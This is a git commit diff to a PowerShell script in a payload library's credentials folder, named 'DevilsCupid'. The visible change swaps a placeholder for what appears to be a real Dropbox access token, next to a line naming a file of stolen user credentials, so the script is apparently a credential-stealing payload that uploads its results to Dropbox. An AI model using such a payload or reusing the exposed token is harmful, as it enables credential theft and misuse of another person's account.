b2abf0041afcc8ff722524b8ca039324d09dd908
loltrollface171 <164838004+loltrollface171@users.noreply.github.com>
2024-05-25 02:38:34 -0500

    Update devilsCupid.ps1

--- payloads/library/credentials/DevilsCupid/devilsCupid.ps1
+++ payloads/library/credentials/DevilsCupid/devilsCupid.ps1
@@ -20,7 +20,7 @@
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
-$DropBoxAccessToken = "<YOUR DROPBOX ACCESS TOKEN HERE>"
+$DropBoxAccessToken = "sl.B140VmdbSxGqH5-bQeBD-kXKCAA_JxdnOVPusn7HvSfSmtGBgYwx7rc4cC0aIrMNBtz9Xa7litN24J9XwoR0OurVd_8lQgSRIrXpUGkeE9IXXNFVhh1UfGRSQvyc0Vz70L50lD6LF10T"
 $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
 
 #------------------------------------------------------------------------------------------------------------------------------------
